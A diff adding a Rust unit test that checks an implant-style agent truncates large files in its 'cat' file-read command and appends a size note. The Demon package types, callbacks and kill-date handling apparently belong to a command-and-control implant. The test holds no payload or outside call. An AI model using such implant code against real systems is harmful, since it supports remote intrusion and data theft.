@@ -1120,6 +1120,51 @@ async fn cat_still_returns_full_file_as_structured_callback() {
 }
 
 #[tokio::test]
+async fn cat_truncates_large_file_and_appends_note() {
+    use super::CAT_SIZE_LIMIT;
+
+    let tempdir = tempfile::tempdir().expect("tempdir");
+    let path = tempdir.path().join("large.bin");
+    // Write a file that exceeds the cap by one byte.
+    let file_size = CAT_SIZE_LIMIT + 1;
+    {
+        use std::io::Write as _;
+        let mut f = std::fs::File::create(&path).expect("create");
+        // Write in 4 KiB chunks to avoid a single huge allocation.
+        let chunk = vec![0u8; 4096];
+        let mut remaining = file_size;
+        while remaining >= 4096 {
+            f.write_all(&chunk).expect("write chunk");
+            remaining -= 4096;
+        }
+        if remaining > 0 {
+            f.write_all(&chunk[..remaining as usize]).expect("write tail");
+        }
+    }
+
+    let mut payload = Vec::new();
+    payload.extend_from_slice(&(DemonFilesystemCommand::Cat as i32).to_le_bytes());
+    payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
+    let package = DemonPackage::new(DemonCommand::CommandFs, 99, payload);
+    let mut state = PhantomState::default();
+
+    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
+
+    let callbacks = state.drain_callbacks();
+    let [PendingCallback::Structured { payload: encoded, .. }] = callbacks.as_slice() else {
+        panic!("unexpected callbacks: {callbacks:?}");
+    };
+    // The encoded payload must contain the truncation note.
+    let note = format!(
+        "\n[truncated: file is {} bytes, only first {} bytes shown]",
+        file_size, CAT_SIZE_LIMIT
+    );
+    let note_bytes = note.as_bytes();
+    let found = encoded.windows(note_bytes.len()).any(|w| w == note_bytes);
+    assert!(found, "truncation note not found in encoded cat response");
+}
+
+#[tokio::test]
 async fn execute_kill_date_stores_timestamp() {
     let timestamp: i64 = 1_800_000_000;
     let payload = timestamp.to_le_bytes().to_vec();
